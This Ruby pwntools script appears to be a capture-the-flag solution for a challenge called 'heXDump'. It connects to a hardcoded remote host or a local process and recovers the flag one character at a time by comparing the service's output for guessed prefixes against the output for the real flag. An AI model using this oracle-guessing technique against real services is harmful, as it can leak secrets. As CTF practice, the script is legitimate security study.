#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

host, port = '13.113.205.160', 21700
@local = false
@p = ''
if ARGV.empty?
  host = '127.0.0.1'; @local = true
  $z = Tubes::Process.new('../release/heXDump.rb')
else
  raise ArgumentError, 'host not set' if host.empty?

  $z = Sock.new(host, port)
end
def z;$z;end
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def libc; @libc ||= ELF.new('./libc.so.6'); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!

def pt(c); z.gets "quit\n"; z.puts c; end

pt(1337)
pt(2)
correct = z.gets
flag = ''
cand = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-! {}"
loop do
  t = cand.each_char.find do |c|
    pt(1)
    z.puts (flag + c).enhex
    pt(2)
    z.gets == correct
  end
  flag += t
  p flag
  break if flag.end_with?('}')
end
z.puts 0
z.close
